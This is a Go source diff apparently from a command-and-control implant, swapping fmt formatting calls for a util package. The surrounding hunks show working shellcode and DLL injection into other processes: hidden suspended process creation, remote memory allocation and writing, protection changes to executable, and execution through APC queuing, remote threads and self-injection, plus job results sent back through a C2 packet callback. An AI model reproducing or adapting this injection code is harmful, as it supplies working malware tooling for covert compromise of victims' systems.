@@ -5,13 +5,13 @@ package command
 import (
 	"bytes"
 	"errors"
-	"fmt"
 	"github.com/Microsoft/go-winio"
 	"golang.org/x/sys/windows"
 	"io"
 	"main/config"
 	"main/packet"
 	"main/sysinfo"
+	"main/util"
 	"strings"
 	"time"
 	"unsafe"
@@ -72,7 +72,7 @@ func InjectDll(b []byte, isDllX64 bool) error {
 		processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, pid)
 		if err != nil {
 			currentPid = 0
-			return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
+			return errors.New(util.Sprintf("OpenProcess error: %s", err))
 		}
 		currentPid = pid
 		//return createRemoteThread(processHandle, dll, 0, nil)
@@ -104,7 +104,7 @@ func listThread(pid uint32) []uint32 {
 	for err != windows.ERROR_NO_MORE_FILES {
 		if te.OwnerProcessID == pid {
 			threadId = append(threadId, te.ThreadID)
-			fmt.Println(te.ThreadID)
+			util.Println(te.ThreadID)
 		}
 		err = windows.Thread32Next(snapshot, &te)
 	}
@@ -157,7 +157,7 @@ func spawnTempProcess(procInfo *windows.ProcessInformation, startupInfo *windows
 	errCreateProcess := createProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo, ignoreToken)
 	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
 		currentPid = 0
-		return errors.New(fmt.Sprintf("CreateProcess error: %s", errCreateProcess.Error()))
+		return errors.New(util.Sprintf("CreateProcess error: %s", errCreateProcess.Error()))
 	}
 	return nil
 }
@@ -196,25 +196,25 @@ func callUserAPC(processHandle windows.Handle, threadHandle windows.Handle, shel
 	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("VirtualAlloc error: %s", errVirtualAlloc))
+		return errors.New(util.Sprintf("VirtualAlloc error: %s", errVirtualAlloc))
 	}
 	var length uintptr
 	errWriteProcessMemory := windows.WriteProcessMemory(processHandle, addr, &shellcode[0], uintptr(len(shellcode)), &length)
 	if errWriteProcessMemory != nil {
-		return errors.New(fmt.Sprintf("WriteProcessMemory error: %s", errWriteProcessMemory))
+		return errors.New(util.Sprintf("WriteProcessMemory error: %s", errWriteProcessMemory))
 	}
 	oldProtect := windows.PAGE_READWRITE
 	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(processHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("VirtualProtectEx error: %s", errVirtualProtectEx))
+		return errors.New(util.Sprintf("VirtualProtectEx error: %s", errVirtualProtectEx))
 	}
 	_, _, err := queueUserAPC.Call(addr+uintptr(offset), uintptr(threadHandle), 0)
 	if err != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("QueueUserAPC error: %s", err))
+		return errors.New(util.Sprintf("QueueUserAPC error: %s", err))
 	}
 	_, errResumeThread := windows.ResumeThread(threadHandle)
 	if errResumeThread != nil {
-		return errors.New(fmt.Sprintf("ResumeThread error: %s", errResumeThread))
+		return errors.New(util.Sprintf("ResumeThread error: %s", errResumeThread))
 	}
 	return nil
 }
@@ -226,7 +226,7 @@ func createRemoteThread(processHandle windows.Handle, shellcode []byte, offset u
 		argsAddr, _, errVirtualAlloc = virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(args)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 		if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
-			return errors.New(fmt.Sprintf("VirtualAllocEx error: %s", errVirtualAlloc))
+			return errors.New(util.Sprintf("VirtualAllocEx error: %s", errVirtualAlloc))
 		}
 
 		if argsAddr == 0 {
@@ -236,14 +236,14 @@ func createRemoteThread(processHandle windows.Handle, shellcode []byte, offset u
 		errWriteProcessMemory := windows.WriteProcessMemory(processHandle, argsAddr, &args[0], uintptr(len(args)), &writtenBytes)
 
 		if errWriteProcessMemory != nil && errWriteProcessMemory != windows.SEVERITY_SUCCESS {
-			return errors.New(fmt.Sprintf("[!]Error calling WriteProcessMemory: %s", errWriteProcessMemory))
+			return errors.New(util.Sprintf("[!]Error calling WriteProcessMemory: %s", errWriteProcessMemory))
 		}
 	}
 
 	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("VirtualAllocEx error: %s", errVirtualAlloc))
+		return errors.New(util.Sprintf("VirtualAllocEx error: %s", errVirtualAlloc))
 	}
 
 	if addr == 0 {
@@ -253,18 +253,18 @@ func createRemoteThread(processHandle windows.Handle, shellcode []byte, offset u
 	errWriteProcessMemory := windows.WriteProcessMemory(processHandle, addr, &shellcode[0], uintptr(len(shellcode)), &writtenBytes)
 
 	if errWriteProcessMemory != nil && errWriteProcessMemory != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("[!]Error calling WriteProcessMemory: %s", errWriteProcessMemory))
+		return errors.New(util.Sprintf("[!]Error calling WriteProcessMemory: %s", errWriteProcessMemory))
 	}
 
 	oldProtect := windows.PAGE_READWRITE
 	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(processHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("Error calling VirtualProtectEx: %s", errVirtualProtectEx))
+		return errors.New(util.Sprintf("Error calling VirtualProtectEx: %s", errVirtualProtectEx))
 	}
 	// offset is the shellcode prepends in c2profile
 	_, _, errCreateRemoteThreadEx := createRemoteThreadEx.Call(uintptr(processHandle), 0, 0, addr+uintptr(offset), argsAddr, 0, 0)
 	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx: %s", errCreateRemoteThreadEx))
+		return errors.New(util.Sprintf("[!]Error calling CreateRemoteThreadEx: %s", errCreateRemoteThreadEx))
 	}
 	return nil
 }
@@ -278,34 +278,34 @@ func injectSelf(shellcode []byte, offset uint32, args []byte) error {
 		var err error
 		argsAddr, err = windows.VirtualAlloc(0, uintptr(len(args)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
 		if err != nil {
-			return errors.New(fmt.Sprintf("VirtualAlloc Error: %s", err))
+			return errors.New(util.Sprintf("VirtualAlloc Error: %s", err))
 		}
 		// invalidHandle represent self
 		var bytesWritten uintptr
 		err = windows.WriteProcessMemory(windows.InvalidHandle, argsAddr, &args[0], uintptr(len(args)), &bytesWritten)
 		if err != nil {
-			return errors.New(fmt.Sprintf("WriteProcessMemory Error: %s", err))
+			return errors.New(util.Sprintf("WriteProcessMemory Error: %s", err))
 		}
 	}
 
 	addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
 	if err != nil {
-		return errors.New(fmt.Sprintf("VirtualAlloc Error: %s", err))
+		return errors.New(util.Sprintf("VirtualAlloc Error: %s", err))
 	}
 	var bytesWritten uintptr
 	err = windows.WriteProcessMemory(windows.InvalidHandle, addr, &shellcode[0], uintptr(len(shellcode)), &bytesWritten)
 	if err != nil {
-		return errors.New(fmt.Sprintf("WriteProcessMemory Error: %s", err))
+		return errors.New(util.Sprintf("WriteProcessMemory Error: %s", err))
 	}
 	var oldProtect uint32
 	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
 	if err != nil {
-		return errors.New(fmt.Sprintf("VirtualProtect Error: %s", err))
+		return errors.New(util.Sprintf("VirtualProtect Error: %s", err))
 	}
 	var threadId uint32
 	_, _, err = createThread.Call(0, 0, addr+uintptr(offset), argsAddr, 0, uintptr(threadId))
 	if err != nil && err != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("CreateThread Error: %s", err))
+		return errors.New(util.Sprintf("CreateThread Error: %s", err))
 	}
 	return nil
 }
@@ -359,7 +359,7 @@ func HandlerJobAsync(b []byte) error {
 func ListJobs() error {
 	result := ""
 	for _, job := range jobs {
-		result += fmt.Sprintf("%d\t%d\t%s\n", job.jid, job.pid, job.description)
+		result += util.Sprintf("%d\t%d\t%s\n", job.jid, job.pid, job.description)
 	}
 	packet.PushResult(packet.CALLBACK_LIST_JOBS, []byte(result))
 	return nil
@@ -393,7 +393,7 @@ func readNamedPipe(j job) (string, error) {
 		time.Sleep(time.Millisecond * time.Duration(j.sleepTime))
 		pipe, err = winio.DialPipe(j.pipeName, nil)
 		if err != nil {
-			return "", errors.New(fmt.Sprintf("DialPipe error: %s", err))
+			return "", errors.New(util.Sprintf("DialPipe error: %s", err))
 		}
 	}
 	defer pipe.Close()
@@ -402,7 +402,7 @@ func readNamedPipe(j job) (string, error) {
 	for {
 		select {
 		case <-j.stopCh:
-			return result + fmt.Sprintf("\njob %d canceled", j.jid), nil
+			return result + util.Sprintf("\njob %d canceled", j.jid), nil
 		default:
 			n, err := pipe.Read(buf)
 			// if you kill the process, pipe will be closed and there will receive an EOF
